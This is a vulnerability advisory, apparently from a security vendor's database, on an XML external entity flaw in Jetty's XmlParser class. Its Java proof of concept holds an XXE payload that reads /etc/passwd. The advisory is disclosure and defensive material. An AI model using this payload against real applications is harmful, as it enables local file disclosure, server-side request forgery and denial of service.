{"hash":"6b5f1ed79674d35c19656fece5448850348effb2","data":{"post":{"title":"Jetty XmlParser XXE","path":"/vulnerabilities/jetty-xml-parser-xxe-xray-523189/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Jetty XmlParser is vulnerable to XML external entity (XXE) vulnerability</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>org.eclipse.jetty:xml</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,) Currently no fixed version</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>XmlParser is vulnerable to XML external entity (XXE) vulnerability.\nXmlParser is being used when parsing Jetty’s xml configuration files. An attacker might exploit\nthis vulnerability in order to achieve SSRF or cause a denial of service.\nOne possible scenario is importing a (remote) malicious WAR into a Jetty’s server, while the\nWAR includes a malicious web.xml.</p>\n<p>This is not considered a vulnerability of the Jetty server itself, as any such usage of the Jetty XmlParser is equally vulnerable as a direct usage of the JVM supplied SAX parser.</p>\n<p>However, any direct usage of the <code>XmlParser</code> class by an application may be vulnerable. The impact would greatly depend on how the application uses <code>XmlParser</code>, but it could be a denial of service due to large entity expansion, or possibly the revealing local files if the XML results are accessible remotely.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-java\">package com.example;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\nimport org.eclipse.jetty.xml.XmlParser;\nimport org.eclipse.jetty.xml.XmlParser.Node;\nimport org.xml.sax.SAXException;\n\npublic class App \n{\n    public static void main( String[] args )\n    {\n        XmlParser xmlParser = new XmlParser(true);\n        String xmlContent = \"&#x3C;?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?>&#x3C;!DOCTYPE foo [ &#x3C;!ELEMENT foo ANY > &#x3C;!ENTITY xxe SYSTEM \\\"file:///etc/passwd/\\\" >]>&#x3C;foo>&#x26;xxe;&#x3C;/foo>\";\n        InputStream targetStream = new ByteArrayInputStream(xmlContent.getBytes());\n        try {\n            Node node = xmlParser.parse(targetStream);\n            System.out.println(node.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (SAXException e) {\n            System.out.println(e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/eclipse/jetty.project/security/advisories/GHSA-58qw-p7qm-5rvh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/eclipse/jetty.project/security/advisories/GHSA-58qw-p7qm-5rvh</a></p>\n<p><a href=\"https://github.com/eclipse/jetty.project/pull/10067\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/eclipse/jetty.project/pull/10067</a></p>\n","description":"XRAY-523189, MEDIUM, Jetty XmlParser XXE","date_published":"2023-07-12","xray_id":"XRAY-523189","vul_id":"","severity":"medium","discovered_by":"Uriya Yavnieli","last_updated":"2023-07-12","cvss":null}},"context":{}}